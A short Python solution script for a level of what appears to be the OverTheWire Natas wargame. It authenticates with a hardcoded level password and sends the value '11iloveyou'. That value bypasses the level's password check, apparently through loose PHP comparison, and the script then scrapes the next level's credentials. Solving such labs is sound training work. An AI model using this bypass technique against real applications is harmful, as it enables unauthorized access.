# Source Code Review

import re
import requests
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas23'
password = 'qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj'

# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'

# Create a session and set the authorization credentials
session = requests.Session()

# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)

params = {"passwd": "11iloveyou", "submit": "whatever"}

# GET request with payload
resp = session.get(url, params=params)

print(f"Username: {re.search('Username: (.*) P', resp.text).group(1)}")
print(f"Password: {re.search('Password: (.*)</pre>', resp.text).group(1)}")
